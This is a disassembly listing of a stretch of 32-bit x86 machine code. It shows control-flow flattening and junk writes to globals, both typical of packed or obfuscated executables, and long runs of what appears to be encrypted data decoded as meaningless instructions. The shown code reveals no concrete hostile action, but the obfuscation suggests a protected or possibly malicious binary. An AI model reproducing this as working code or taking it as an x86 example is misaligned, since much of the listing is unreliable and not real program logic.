  40e2ed:	mov    eax,ds:0x413bbc
  40e2f2:	mov    DWORD PTR ds:0x43371b,0x4b6e
  40e2fc:	mov    eax,DWORD PTR [eax]
  40e2fe:	mov    DWORD PTR ds:0x43381f,0x73ce
  40e308:	mov    DWORD PTR [ebp-0x18],eax
  40e30b:	mov    DWORD PTR ds:0x43382b,0x7077
  40e315:	jmp    0x40e830
  40e31a:	mov    DWORD PTR ds:0x4337df,0xab2
  40e324:	cmp    edi,0x33d
  40e32a:	mov    DWORD PTR ds:0x43381b,0x48b4
  40e334:	jne    0x40e3b3
  40e33a:	xor    DWORD PTR ds:0x4337d7,0x79d9
  40e344:	and    DWORD PTR [ebp+0x8],0x0
  40e348:	mov    eax,DWORD PTR [ebp-0x8]
  40e34b:	add    DWORD PTR ds:0x433753,0x43375f
  40e355:	sub    eax,DWORD PTR [ebp+0x8]
  40e358:	xor    DWORD PTR ds:0x4337a7,0x7a28
  40e362:	push   eax
  40e363:	sbb    DWORD PTR ds:0x4337d3,0x14e6
  40e36d:	mov    eax,DWORD PTR [ebp-0x4]
  40e370:	mov    DWORD PTR ds:0x4337d7,0x5b5
  40e37a:	add    eax,DWORD PTR [ebp+0x8]
  40e37d:	push   eax
  40e37e:	call   0x4032fa
  40e383:	mov    DWORD PTR ds:0x433703,0x5b4b
  40e38d:	inc    DWORD PTR [ebp+0x8]
  40e390:	cmp    DWORD PTR [ebp+0x8],0x52
  40e394:	mov    DWORD PTR ds:0x433703,0x3dd6
  40e39e:	jb     0x40e348
  40e3a4:	mov    DWORD PTR ds:0x433797,0x7cb6
  40e3ae:	jmp    0x40e830
  40e3b3:	mov    DWORD PTR ds:0x433703,0x6b28
  40e3bd:	cmp    edi,0x1a3
  40e3c3:	mov    DWORD PTR ds:0x4337af,0x27e
  40e3cd:	jne    0x40e58c
  40e3d3:	movzx  eax,BYTE PTR ds:0x43382b
  40e3da:	and    DWORD PTR ds:0x43370b,eax
  40e3e0:	mov    DWORD PTR [ebp-0x60],0xf89c853d
  40e3e7:	add    DWORD PTR ds:0x433763,0x2f92
  40e3f1:	mov    eax,DWORD PTR [ebp-0x4]
  40e3f4:	mov    DWORD PTR [ebp-0x5c],eax
  40e3f7:	mov    eax,DWORD PTR [ebp-0x8]
  40e3fa:	mov    DWORD PTR [ebp-0x58],eax
  40e3fd:	and    eax,DWORD PTR ds:0x433813
  40e403:	jmp    0x40e53c
  40e408:	test   al,0xb5
  40e40a:	test   al,0xe6
  40e40c:	mov    cl,0xe3
  40e40e:	jo     0x40e481
  40e410:	stc    
  40e411:	ret    0x425b
  40e414:	push   eax
  40e415:	mov    eax,DWORD PTR ds:0x7e9816ba
  40e41b:	jle    0x40e42f
  40e41d:	jg     0x40e49d
  40e41f:	jle    0x40e40e
  40e421:	mov    ebx,0x4927d99f
  40e426:	xchg   ebp,eax
  40e427:	sbb    BYTE PTR [ebp+eiz*2-0x7c],ah
  40e42b:	cmc    
  40e42c:	dec    ebp
  40e42d:	aas    
  40e42e:	push   ebx
  40e42f:	sbb    cl,BYTE PTR [edi-0x28]
  40e432:	inc    eax
  40e433:	pop    edi
  40e434:	jge    0x40e42f
  40e436:	pop    ebx
  40e437:	sub    eax,DWORD PTR [ebp-0x61]
  40e43a:	(bad)  
  40e43b:	mov    esp,0xe398e609
  40e440:	pop    esp
  40e441:	cmp    DWORD PTR [edx+0x4384832a],ebx
  40e447:	jb     0x40e46f
  40e449:	xchg   edi,eax
  40e44a:	fsubr  QWORD PTR [edi+0x4396f20a]
  40e450:	fidivr WORD PTR [esi+0x8751c4f]
  40e456:	adc    esi,ebx
  40e458:	pusha  
  40e459:	out    dx,al
  40e45a:	dec    ecx
  40e45b:	mov    eax,0xd34beaa6
  40e460:	(bad)  
  40e461:	pop    ecx
  40e462:	xor    BYTE PTR [esi-0x342e6a5b],al
  40e468:	push   ecx
  40e469:	in     al,0xfa
  40e46b:	ins    DWORD PTR es:[edi],dx
  40e46c:	dec    edi
  40e46d:	dec    ecx
  40e46e:	retf   
  40e46f:	xor    BYTE PTR [ebx-0x18],bl
  40e472:	push   ecx
  40e473:	int    0x3c
  40e475:	mov    edx,DWORD PTR [ebx]
  40e477:	popf   
  40e478:	and    ebp,esi
  40e47a:	and    eax,0x8ebf06f0
  40e47f:	(bad)  
  40e480:	jns    0x40e49b
  40e482:	nop
  40e483:	call   0xa6fb2351
  40e488:	xchg   edi,eax
  40e489:	(bad)  
  40e48a:	test   eax,0xaa2db481
  40e48f:	inc    esi
  40e490:	mov    ebx,0xff5bdc44
  40e495:	adc    al,0xf7
  40e497:	push   eax
  40e498:	pop    sp
  40e49a:	push   esp
  40e49b:	xchg   esi,ebp
  40e49d:	xor    BYTE PTR [edx+0x2d94da2a],0x56
  40e4a4:	cld    
  40e4a5:	xchg   ecx,eax
  40e4a6:	rol    ch,cl
  40e4a8:	ret    
  40e4a9:	add    eax,DWORD PTR [edi+0x6424c2ad]
  40e4af:	add    ecx,edi
  40e4b1:	std    
  40e4b2:	daa    
  40e4b3:	int3   
  40e4b4:	nop
  40e4b5:	cmp    al,0x50
  40e4b7:	mov    ecx,0x3c8e7569
  40e4bc:	push   ecx
  40e4bd:	push   eax
  40e4be:	retf   0x448f
  40e4c1:	or     BYTE PTR [ebp+0x4deeac59],dl
  40e4c7:	pop    ebp
  40e4c8:	lea    esp,[edx+0x1af5ecaf]
  40e4ce:	add    dh,BYTE PTR [edi-0x72982e68]
  40e4d4:	cmp    DWORD PTR gs:[edx+eax*2-0x4df82968],eax
  40e4dc:	sub    eax,0xa8c5331b
  40e4e1:	(bad)  
  40e4e2:	jmp    0x40e485
  40e4e4:	jmp    0x1de7:0x4604f194
  40e4eb:	pop    ss
  40e4ec:	pop    esi
  40e4ed:	push   eax
  40e4ee:	push   ecx
  40e4ef:	lock pusha 
  40e4f1:	mov    ds:0xd0a6b226,al
  40e4f6:	leave  
  40e4f7:	cmp    esi,DWORD PTR [ebx+0x1b499382]
  40e4fd:	scas   al,BYTE PTR es:[edi]
  40e4fe:	bound  edx,QWORD PTR [esi+0x2e73c7d4]
  40e504:	les    ebp,FWORD PTR [ebp*1-0x55b882f8]
  40e50b:	jg     0x40e49e
  40e50d:	pop    edi
  40e50e:	fldz   
  40e510:	iret   
  40e511:	mov    al,ds:0xb998bc69
  40e516:	retf   
  40e517:	mov    edi,eax
  40e519:	pop    edi
  40e51a:	sbb    DWORD PTR [edi],esp
  40e51c:	scas   al,BYTE PTR es:[edi]
  40e51d:	ins    DWORD PTR es:[edi],dx
  40e51e:	imul   edi,ebp,0xffffff91
  40e521:	dec    edi
  40e522:	sub    DWORD PTR [ecx-0x80eceee],eax
  40e528:	lahf   
  40e529:	inc    eax
  40e52a:	loope  0x40e4d1
  40e52c:	iret   
  40e52d:	adc    BYTE PTR [esi],0xa5
  40e530:	jbe    0x40e52f
  40e532:	les    ecx,FWORD PTR [eax]
  40e534:	nop
  40e535:	ins    DWORD PTR es:[edi],dx
  40e536:	(bad)  
  40e538:	call   0x8c114a0b
  40e53d:	inc    ebp
  40e53e:	hlt    
  40e53f:	or     DWORD PTR ds:0x4337a3,0x4337eb
  40e549:	xor    eax,esi
  40e54b:	add    eax,ebx
  40e54d:	sbb    DWORD PTR ds:0x4337db,0x4337af
  40e557:	mov    DWORD PTR [ebp-0x54],eax
  40e55a:	lea    eax,[ebp-0x1c]
  40e55d:	mov    DWORD PTR [ebp-0x50],eax
  40e560:	mov    eax,DWORD PTR [ebp-0x60]
  40e563:	xor    eax,esi
  40e565:	add    eax,ebx
  40e567:	mov    DWORD PTR [ebp-0x60],eax
  40e56a:	lea    eax,[ebp-0x60]
  40e56d:	push   eax
  40e56e:	mov    eax,DWORD PTR [ebp+0xc]
  40e571:	xor    eax,esi
  40e573:	add    eax,ebx
  40e575:	push   eax
  40e576:	mov    eax,ds:0x413b54
  40e57b:	push   0x413aaa
  40e580:	push   DWORD PTR [eax]
  40e582:	call   0x40984d
  40e587:	jmp    0x40e830
  40e58c:	cmp    edi,0x13d
  40e592:	jne    0x40e830
  40e598:	mov    eax,DWORD PTR [ebp-0x10]
  40e59b:	xor    eax,esi
  40e59d:	add    eax,ebx
  40e59f:	mov    DWORD PTR [ebp+0x8],eax
  40e5a2:	jmp    0x40e6db
  40e5a7:	shl    BYTE PTR [eax+eax*8-0xf8f9fd0],0x74
  40e5af:	sub    eax,0x3cf261b8
  40e5b4:	adc    BYTE PTR [edi-0x1b],al
  40e5b7:	sub    bl,BYTE PTR [ecx+0x7f127e7e]
  40e5bd:	jle    0x40e63d
  40e5bf:	(bad)  
  40e5c0:	mov    ds:0x4c227780,al
  40e5c5:	dec    edx
  40e5c6:	dec    ebx
  40e5c7:	dec    edx
  40e5c8:	call   0xb84c:0x2a0dbe2d
  40e5cf:	pop    ss
  40e5d0:	cs sbb eax,0x171a12c4
  40e5d6:	ins    DWORD PTR es:[edi],dx
  40e5d7:	jbe    0x40e5b8
  40e5d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e5da:	adc    al,0x77
  40e5dc:	inc    ecx
  40e5dd:	ds repnz out dx,eax
  40e5e0:	mov    al,0xf
  40e5e2:	xchg   ecx,eax
  40e5e3:	push   edi
  40e5e4:	lods   eax,DWORD PTR ds:[esi]
  40e5e5:	jnp    0x40e64b
  40e5e7:	cmp    DWORD PTR [ebp+0x44],esp
  40e5ea:	dec    ecx
  40e5eb:	(bad)  
  40e5ec:	outs   dx,DWORD PTR ds:[esi]
  40e5ed:	mov    ebp,DWORD PTR [ebx]
  40e5ef:	jp     0x40e57c
  40e5f1:	int    0xf3
  40e5f3:	addr16 pop eax
  40e5f5:	repz scas al,BYTE PTR es:[edi]
  40e5f7:	pusha  
  40e5f8:	mov    bh,0xec
  40e5fa:	aam    0xba
  40e5fc:	mov    cs,WORD PTR [eax+0x18]
  40e5ff:	stos   DWORD PTR es:[edi],eax
  40e600:	inc    esi
  40e601:	xchg   esi,eax
  40e602:	or     DWORD PTR ds:0xbfadebde,ebx
  40e608:	out    dx,eax
  40e609:	loope  0x40e5a1
  40e60b:	sbb    al,0xd0
  40e60d:	and    dh,dl
  40e60f:	aaa    
  40e610:	xor    BYTE PTR [edi+edi*4-0x6d50c102],al
  40e617:	sub    edx,DWORD PTR [eax+0x73]
  40e61a:	pop    ss
  40e61b:	inc    eax
  40e61c:	retf   
  40e61d:	push   edx
  40e61e:	and    eax,0x74363de1
  40e623:	fld    DWORD PTR [esi]
  40e625:	mov    eax,0xa259e65d
  40e62a:	jmp    0x9765:0x8d0365c9
  40e631:	pop    DWORD PTR [ebp+0x72]
  40e634:	sbb    BYTE PTR [ebx-0x1b9a45de],ch
  40e63a:	popf   
  40e63b:	imul   ecx,DWORD PTR [ecx*4-0x75f29e0c],0xfffffff5
  40e643:	js     0x40e6bc
  40e645:	xor    al,0xa9
  40e647:	pop    ss
  40e648:	jmp    0xca2b:0xadf87c9
  40e64f:	lea    ebp,[esi]
  40e651:	mov    ebp,0x8210bc3c
  40e656:	pop    edx
  40e657:	icebp  
  40e658:	adc    eax,0xb31209dd
  40e65d:	push   ebp
  40e65e:	push   es
  40e65f:	inc    ebp
  40e660:	stc    
  40e661:	into   
  40e662:	icebp  
  40e663:	retf   
  40e664:	pop    ecx
  40e665:	mov    eax,ds:0x2744a9b9
  40e66a:	xchg   DWORD PTR [edx+0x64],edx
  40e66d:	call   0x99457948
  40e672:	(bad)  
  40e673:	cmc    
  40e674:	sbb    DWORD PTR [edx+0x47],esi
  40e677:	in     eax,dx
  40e678:	add    BYTE PTR [ecx+0x251af602],ch
  40e67e:	pop    ds
  40e67f:	outs   dx,BYTE PTR ds:[esi]
  40e680:	cmp    ch,BYTE PTR [edx-0x73]
  40e683:	ss jae 0x40e61c
  40e686:	xor    edi,DWORD PTR [eax+0x1c5526e6]
  40e68c:	inc    esi
  40e68d:	into   
  40e68e:	fbld   TBYTE PTR [ebx]
  40e690:	bound  ebx,QWORD PTR [ecx-0x3c]
  40e693:	jmp    edi
  40e695:	pop    esp
  40e696:	mov    ah,0x2e
  40e698:	bnd ret 
  40e69a:	sbb    eax,0x1f318f41
  40e69f:	ds push edx
  40e6a1:	cmp    BYTE PTR [eax+0x68ed5e87],dl
  40e6a7:	pop    esp
  40e6a8:	xor    BYTE PTR [esi+eiz*2-0x3e],ch
  40e6ac:	sub    DWORD PTR [esi+0x40bf354b],edx
  40e6b2:	cdq    
  40e6b3:	aaa    
  40e6b4:	and    esp,esi
  40e6b6:	popa   
  40e6b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e6b8:	cdq    
  40e6b9:	jno    0x40e6f6
  40e6bb:	pop    edi
  40e6bc:	jle    0x40e717
  40e6be:	jp     0x40e671
  40e6c0:	pop    ss
  40e6c1:	or     esp,DWORD PTR [eax+0x7fd289d]
  40e6c7:	and    dh,BYTE PTR [ebx+0x3e]
  40e6ca:	outs   dx,DWORD PTR ds:[esi]
  40e6cb:	scas   eax,DWORD PTR es:[edi]
  40e6cc:	inc    eax
  40e6cd:	mov    ds:0xea5f0806,al
  40e6d2:	pop    edx
  40e6d3:	xor    DWORD PTR [ebp-0x45],esi
  40e6d6:	test   DWORD PTR [edi],0xa1ad23f1
  40e6dc:	xor    al,0x3b
  40e6de:	inc    ecx
  40e6df:	add    BYTE PTR [ecx+0x458b0845],cl
  40e6e5:	in     al,dx
  40e6e6:	jmp    0x40e81f
  40e6eb:	jb     0x40e70f
  40e6ed:	lods   al,BYTE PTR ds:[esi]
  40e6ee:	jmp    0x9bdf:0xa270706c
  40e6f5:	mov    al,BYTE PTR [ecx-0x4359d770]
  40e6fb:	into   
  40e6fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6fd:	jle    0x40e77d
  40e6ff:	adc    bh,BYTE PTR [edi+0x7e]
  40e702:	jle    0x40e721
  40e704:	cmc    
  40e705:	jp     0x40e764
  40e707:	mov    al,0x14
  40e709:	in     al,dx
  40e70a:	fidivr DWORD PTR [edi-0x55385f9c]
  40e710:	cwde   
  40e711:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  40e713:	dec    eax
  40e714:	pop    esp
  40e715:	push   eax
  40e716:	cli    
  40e717:	and    edi,DWORD PTR [eax]
  40e719:	(bad)  
  40e71a:	cmp    DWORD PTR cs:[ebp+0x4b],ecx
  40e71e:	jecxz  0x40e711
  40e720:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e721:	in     al,0x96
  40e723:	int    0xdf
  40e725:	jp     0x40e74d
  40e727:	jl     0x40e6ab
  40e729:	ficom  WORD PTR [edi]
  40e72b:	into   
  40e72c:	inc    ebp
  40e72d:	out    dx,al
  40e72e:	ficom  DWORD PTR [edi-0x5]
  40e731:	and    al,0x58
  40e733:	sbb    cl,BYTE PTR [edx+edi*8-0x3b]
  40e737:	and    DWORD PTR [eax-0x69],ebp
  40e73a:	das    
  40e73b:	fisttp WORD PTR [edi+eiz*1-0x2901e6fe]
  40e742:	sub    edi,DWORD PTR [edi]
  40e744:	sbb    BYTE PTR [ecx],ah
  40e746:	in     eax,0x4d
  40e748:	shr    DWORD PTR [edx+0x60],cl
  40e74b:	ins    DWORD PTR es:[edi],dx
  40e74c:	pop    eax
  40e74d:	jp     0x40e7c3
  40e74f:	xchg   BYTE PTR [ebx-0x409aaeee],dh
  40e755:	pop    ds
  40e756:	xor    esi,DWORD PTR gs:[ecx-0x4451b71b]
  40e75d:	dec    edx
  40e75e:	pop    eax
  40e75f:	mov    ds,WORD PTR [edx]
  40e761:	jle    0x40e7be
  40e763:	iret   
  40e764:	and    eax,0x217bc2aa
  40e769:	sub    ecx,esp
  40e76b:	xchg   edi,eax
  40e76c:	pushf  
  40e76d:	imul   BYTE PTR [edi-0x25]
  40e770:	pop    ss
  40e771:	neg    DWORD PTR [esp+ecx*1+0x1a]
  40e775:	loope  0x40e7a6
  40e777:	(bad)  
  40e778:	or     al,0x28
  40e77a:	dec    esp
  40e77b:	lea    esi,[ebp+eax*2-0x2a301277]
  40e782:	pop    ebx
  40e783:	fucomp st(1)
  40e785:	inc    ebp
  40e786:	mov    DWORD PTR [edi+0x69e24e95],ecx
  40e78c:	sub    DWORD PTR [esi-0x74],ecx
  40e78f:	dec    edi
  40e790:	jnp    0x40e77f
  40e792:	icebp  
  40e793:	adc    ebp,ecx
  40e795:	les    esi,FWORD PTR [ecx+0x25]
  40e798:	mov    ecx,0x6783ad7a
  40e79d:	out    dx,eax
  40e79e:	adc    DWORD PTR [ebx],0x6f
  40e7a1:	jno    0x40e764
  40e7a3:	jns    0x40e7da
  40e7a5:	mov    ah,0x85
  40e7a7:	sbb    al,0x29
  40e7a9:	daa    
  40e7aa:	dec    esp
  40e7ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e7ac:	xchg   bh,dh
  40e7ae:	push   edi
  40e7af:	lods   al,BYTE PTR ds:[esi]
  40e7b0:	arpl   bx,si
  40e7b2:	in     eax,dx
  40e7b3:	push   cs
  40e7b4:	daa    
  40e7b5:	pop    esi
  40e7b6:	daa    
  40e7b7:	into   
  40e7b8:	push   eax
  40e7b9:	push   0x59
  40e7bb:	pop    edi
  40e7bc:	and    eax,0x6bf72ea1
  40e7c1:	and    al,0xc
  40e7c3:	lahf   
  40e7c4:	jmp    0x4ba9:0xae6f8920
  40e7cb:	mov    bp,0xb63b
  40e7cf:	xor    ch,BYTE PTR [esi+eiz*2+0x1f]
  40e7d3:	sub    BYTE PTR [edi-0x4d],ah
  40e7d6:	ins    BYTE PTR es:[edi],dx
  40e7d7:	jmp    0x374d:0xb17b8a1b
  40e7de:	lods   eax,DWORD PTR ds:[esi]
  40e7df:	out    dx,al
  40e7e0:	lea    edx,[edx+ebp*4]
  40e7e3:	inc    ebp
  40e7e4:	dec    esi
  40e7e5:	push   es
  40e7e6:	ja     0x40e832
  40e7e8:	cmp    cl,dh
  40e7ea:	mov    esi,0xa2e8c5ff
  40e7ef:	lock out dx,eax
  40e7f1:	add    edx,DWORD PTR [esi+esi*1-0x4f]
  40e7f5:	(bad)  
  40e7f6:	into   
  40e7f7:	dec    edi
  40e7f8:	inc    ebx
  40e7f9:	sbb    ah,bh
  40e7fb:	sbb    BYTE PTR [ebp-0x4],cl
  40e7fe:	push   ss
  40e7ff:	bound  eax,QWORD PTR [edi-0x47]
  40e802:	imul   ecx,DWORD PTR [edi+eax*4+0x1deb417c],0x42
  40e80a:	inc    esi
  40e80b:	iret   
  40e80c:	cli    
  40e80d:	ret    
  40e80e:	in     al,0xaa
  40e810:	loopne 0x40e7b7
  40e812:	mov    edi,?
  40e814:	sbb    BYTE PTR [ebp+0x1a4efb82],al
  40e81a:	inc    ebp
  40e81b:	xor    ebp,DWORD PTR [eax]
  40e81d:	lock inc ebx
  40e81f:	mov    DWORD PTR [ebp-0x4],eax
  40e822:	mov    eax,DWORD PTR [ebp-0x4]
  40e825:	push   0x4
  40e827:	pop    ecx
  40e828:	sub    ecx,eax
  40e82a:	add    ecx,DWORD PTR [ebp-0x18]
  40e82d:	mov    DWORD PTR [ebp-0x8],ecx
  40e830:	mov    eax,DWORD PTR [ebp+0xc]
  40e833:	xor    eax,esi
  40e835:	lea    edi,[edi+eax*1+0x32729b]
  40e83c:	cmp    edi,0x50b
  40e842:	jmp    0x40e97b
  40e847:	xor    al,0xd8
  40e849:	xchg   ebx,eax
  40e84a:	das    
  40e84b:	push   ebx
  40e84c:	jne    0x40e7fe
  40e84e:	loope  0x40e887
  40e850:	jecxz  0x40e800
  40e852:	loope  0x40e7de
  40e854:	popa   
  40e855:	mov    ch,0xc5
  40e857:	loop   0x40e800
  40e859:	jle    0x40e8d9
  40e85b:	adc    bh,BYTE PTR [edi+0x7e]
  40e85e:	jle    0x40e8b3
  40e860:	fwait
  40e861:	cmp    DWORD PTR [esi],0xcf19d4f1
  40e867:	pop    ss
  40e868:	js     0x40e8df
  40e86a:	rol    DWORD PTR [edi],1
  40e86c:	cld    
  40e86d:	mov    ebx,0x3a3c2767
  40e872:	test   BYTE PTR [esi-0x64],dh
  40e875:	fsub   st(0),st
  40e877:	enter  0x3965,0x32
  40e87b:	xor    bh,BYTE PTR [esi]
  40e87d:	add    al,0x10
  40e87f:	mov    edi,0x9dce0044
  40e884:	dec    ecx
  40e885:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  40e887:	adc    al,0x4a
  40e889:	mov    WORD PTR [ebp-0x6e],?
  40e88c:	or     edi,ebp
  40e88e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e88f:	mov    ebx,0x5ccaabd5
  40e894:	adc    eax,0xa51f177f
  40e899:	pop    ss
  40e89a:	enter  0x6411,0xb2
  40e89e:	(bad)  
  40e89f:	push   esp
  40e8a0:	(bad)  
  40e8a1:	call   0xb113:0x2ccb93e8
  40e8a8:	popf   
  40e8a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e8aa:	adc    al,0x37
  40e8ac:	or     DWORD PTR [esi+eax*8],ebp
  40e8af:	adc    DWORD PTR [ebx-0x66],esi
  40e8b2:	in     al,0x1
  40e8b4:	and    edx,DWORD PTR [ecx]
  40e8b6:	and    dl,BYTE PTR [esp+eiz*4]
  40e8b9:	adc    DWORD PTR [edi-0x78],ebp
  40e8bc:	inc    esi
  40e8bd:	lods   al,BYTE PTR ds:[esi]
  40e8be:	hlt    
  40e8bf:	imul   DWORD PTR [ebx-0x6ceef6f9]
  40e8c5:	push   ecx
  40e8c6:	pop    esp
  40e8c7:	aad    0x6b
  40e8c9:	adc    cl,dl
  40e8cb:	mov    ebx,0x2f6ce080
  40e8d1:	stc    
  40e8d2:	add    bh,BYTE PTR [ebx-0x40]
  40e8d5:	test   DWORD PTR [ebp+ecx*1+0x4],edi
  40e8d9:	or     al,0xd5
  40e8db:	jne    0x40e937
  40e8dd:	sbb    eax,0xab11001a
  40e8e2:	mov    ebx,0x54582c7a
  40e8e7:	int    0xe7
  40e8e9:	pop    ds
  40e8ea:	mov    edi,0xeb4f0a4f
  40e8ef:	or     ebx,DWORD PTR [ebp-0x5]
  40e8f2:	pop    ds
  40e8f3:	fst    QWORD PTR [ecx+eiz*1]
  40e8f6:	and    eax,0xe5041d67
  40e8fb:	push   ebx
  40e8fc:	les    edx,FWORD PTR [ebx]
  40e8fe:	adc    cl,BYTE PTR [edx-0x53d906f0]
  40e904:	xchg   edi,eax
  40e905:	adc    al,0xf0
  40e907:	imul   edx,DWORD PTR [ecx],0x1ef19a1f
  40e90d:	mov    bl,0xb
  40e90f:	jb     0x40e91f
  40e911:	xchg   esp,eax
  40e912:	repz shl BYTE PTR [eax-0x5180b110],1
  40e919:	out    0xeb,al
  40e91b:	(bad)  
  40e91c:	cmp    al,0x3e
  40e91e:	push   ss
  40e91f:	fiadd  DWORD PTR [esi+0x7b2d55b0]
  40e925:	(bad)  
  40e926:	lock xor eax,0x526c02b2
  40e92c:	fstp   DWORD PTR [esi+0x79215c29]
  40e932:	jb     0x40e9ac
  40e934:	sub    DWORD PTR [eax+0x4f342120],edi
  40e93a:	or     al,0xfc
  40e93c:	push   cs
  40e93d:	(bad)  
  40e93e:	(bad)  
  40e93f:	call   0xe9fa:0x64616ea6
  40e946:	and    BYTE PTR [ecx+esi*2],ah
  40e949:	jmp    DWORD PTR [edx]
  40e94b:	test   BYTE PTR [ebp-0x1b81df0a],ah
  40e951:	inc    ebx
  40e952:	cmp    esi,DWORD PTR [edi+ebx*2]
  40e955:	xchg   edx,eax
  40e956:	xlat   BYTE PTR cs:[ebx]
  40e958:	dec    ebp
  40e959:	adc    bh,BYTE PTR [edi+0x7f8249d0]
  40e95f:	add    esi,esp
  40e961:	scas   al,BYTE PTR es:[edi]
  40e962:	sub    al,0xbb
  40e964:	sub    BYTE PTR ds:[edx],dl
  40e967:	push   edi
  40e968:	cdq    
  40e969:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e96a:	mov    esp,DWORD PTR [ebx]
  40e96c:	mov    bl,0xdd
  40e96e:	jae    0x40e988
  40e970:	(bad)  
  40e971:	push   ds
  40e972:	adc    cl,BYTE PTR [ebx+ebx*1+0x46c6a9ce]
  40e979:	loope  0x40e95e
  40e97b:	jne    0x40e2bf
  40e981:	mov    eax,DWORD PTR [ebp+0xc]
  40e984:	pop    edi
  40e985:	xor    eax,esi
  40e987:	pop    esi
  40e988:	jmp    0x40eac1
  40e98d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e98e:	sbb    bl,dh
  40e990:	loope  0x40ea05
  40e992:	icebp  
  40e993:	mov    ch,0x58
  40e995:	jns    0x40e920
  40e997:	add    eax,0xaf24131d
  40e99c:	pop    edi
  40e99d:	xchg   BYTE PTR [esi+edi*2+0x7e7f127e],ah
  40e9a4:	jle    0x40e959
  40e9a6:	jns    0x40e9a3
  40e9a8:	je     0x40e97f
  40e9aa:	add    DWORD PTR [ebx+0xe],ebp
  40e9ad:	cdq    
  40e9ae:	js     0x40e93e
  40e9b0:	cs dec edx
  40e9b2:	xor    ecx,0xaf59ea0b
  40e9b8:	dec    DWORD PTR [eax]
  40e9ba:	dec    ebp
  40e9bb:	inc    edx
  40e9bc:	test   al,0x99
  40e9be:	scas   eax,DWORD PTR es:[edi]
  40e9bf:	dec    eax
  40e9c0:	mov    dh,0x32
  40e9c2:	inc    eax
  40e9c3:	sbb    eax,0xc6b3224a
  40e9c8:	lea    esp,[edi]
  40e9ca:	mov    esp,0x5ea0a7f5
  40e9cf:	xor    edi,ebp
  40e9d1:	push   cs
  40e9d2:	arpl   di,dx
  40e9d4:	es int3 
  40e9d6:	mov    ch,0x67
  40e9d8:	or     dl,BYTE PTR [edx]
  40e9da:	bound  esi,QWORD PTR [ebp+0x18]
  40e9dd:	inc    esp
  40e9de:	xchg   esp,eax
  40e9df:	pop    esi
  40e9e0:	and    BYTE PTR [esi],dh
  40e9e2:	xlat   BYTE PTR ds:[ebx]
  40e9e3:	data16 (bad) 
  40e9e5:	ss daa 
  40e9e7:	aas    
  40e9e8:	jmp    0x8751:0x841bc72d
  40e9ef:	out    dx,eax
  40e9f0:	mov    BYTE PTR [esi],bl
  40e9f2:	cmp    BYTE PTR [ebp+0x239ee4e4],ch
  40e9f8:	lea    esi,[esi+0x1eddf62e]
  40e9fe:	dec    ebx
  40e9ff:	jle    0x40e989
  40ea01:	shl    DWORD PTR [eax+0x74],cl
  40ea04:	and    dh,BYTE PTR [ebx+0x5a17e172]
  40ea0a:	pop    edi
  40ea0b:	stos   BYTE PTR es:[edi],al
  40ea0c:	ins    BYTE PTR es:[edi],dx
  40ea0d:	je     0x40ea8b
  40ea0f:	jp     0x40e9b0
  40ea11:	ficom  WORD PTR [ecx]
  40ea13:	bound  edx,QWORD PTR [esi-0x18]
  40ea16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea17:	retf   0xab7
  40ea1a:	dec    eax
  40ea1b:	test   BYTE PTR [edi-0x9],dl
  40ea1e:	outs   dx,DWORD PTR ss:[esi]
  40ea20:	mov    eax,0xb2bb8c24
  40ea25:	pop    edx
  40ea26:	clc    
  40ea27:	shl    BYTE PTR [ebp-0x16],cl
  40ea2a:	push   0x2d
  40ea2c:	jnp    0x40ea43
  40ea2e:	inc    eax
  40ea2f:	aaa    
  40ea30:	push   ecx
  40ea31:	jge    0x40ea4d
  40ea33:	ss push ecx
  40ea35:	inc    ebx
  40ea36:	lods   eax,DWORD PTR ds:[esi]
  40ea37:	push   ecx
  40ea38:	mov    ds:0xe61a9f27,al
  40ea3d:	or     eax,0xe5686289
  40ea42:	repnz and al,BYTE PTR [eax+ebx*2]
  40ea46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea47:	jae    0x40ea9a
  40ea49:	cmp    ebp,eax
  40ea4b:	cld    
  40ea4c:	push   eax
  40ea4d:	and    eax,0x99346334
  40ea52:	jmp    0x40ea0c
  40ea54:	adc    ch,al
  40ea56:	xchg   ebx,eax
  40ea57:	les    edi,FWORD PTR [edx]
  40ea59:	sar    BYTE PTR [edi+0x62dee20c],1
  40ea5f:	inc    ebp
  40ea60:	ror    ch,0x95
  40ea63:	sbb    al,0xc0
  40ea65:	mov    dh,0xf5
  40ea67:	mov    edx,0xf77881f9
  40ea6c:	mov    al,ds:0xb15de422
  40ea71:	and    ebx,DWORD PTR [ebx-0x2efbd31b]
  40ea77:	test   BYTE PTR [eax],dl
  40ea79:	scas   al,BYTE PTR es:[edi]
  40ea7a:	pushf  
  40ea7b:	nop
  40ea7c:	add    dl,dl
  40ea7e:	out    0xce,eax
  40ea80:	or     eax,0x4248b977
  40ea85:	mov    esp,0xcc387918
  40ea8a:	push   ebx
  40ea8b:	dec    edi
  40ea8c:	cmp    edi,DWORD PTR [ebx-0x345aeff2]
  40ea92:	push   ss
  40ea93:	xchg   edi,eax
  40ea94:	ret    0xf7c4
  40ea97:	adc    al,0x85
  40ea99:	jecxz  0x40ea9c
  40ea9b:	into   
  40ea9c:	call   DWORD PTR [eax]
  40ea9e:	inc    ebp
  40ea9f:	sbb    edi,ecx
  40eaa1:	or     dh,bh
  40eaa3:	xchg   BYTE PTR [ecx-0x64],ch
  40eaa6:	icebp  
  40eaa7:	das    
  40eaa8:	add    bl,BYTE PTR [eax]
  40eaaa:	in     eax,0x18
  40eaac:	and    eax,0xbd2bbee6
  40eab1:	sbb    al,0xb8
  40eab3:	fimul  DWORD PTR [ecx]
  40eab5:	out    dx,eax
  40eab6:	fstp   QWORD PTR [edi]
  40eab8:	or     ecx,ebx
  40eaba:	push   esp
  40eabb:	hlt    
  40eabc:	pop    edi
  40eabd:	pop    ebx
